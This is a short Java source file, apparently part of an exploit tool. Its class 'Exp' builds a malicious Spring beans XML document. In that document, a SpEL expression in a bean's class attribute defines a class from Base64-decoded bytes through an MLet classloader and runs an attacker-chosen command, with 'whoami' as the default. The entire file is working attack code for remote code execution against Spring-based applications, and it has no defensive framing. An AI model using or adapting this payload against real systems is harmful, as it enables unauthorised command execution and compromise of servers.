package org.example;

public class Exp {
    public static String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
            "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
            "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
            "    xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
            "    <bean id=\"data\" class=\"java.lang.String\">\n" +
            "        <constructor-arg><value></value></constructor-arg>\n" +
            "    </bean>\n" +
            "    <bean id=\"O\" class=\"#{T(org.springframework.cglib.core.ReflectUtils).defineClass('org.example.O',T(org.springframework.util.Base64Utils).decodeFromString(data),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).Cmd('[CMD]')}\"></bean>\n" +
            "\n" +
            "</beans>";

    public static String getxml(String cmd){
        if (cmd.isEmpty()){
            cmd = "whoami";
        }
        String exp = xml.replace("[CMD]", cmd);
        return exp;
    }
}
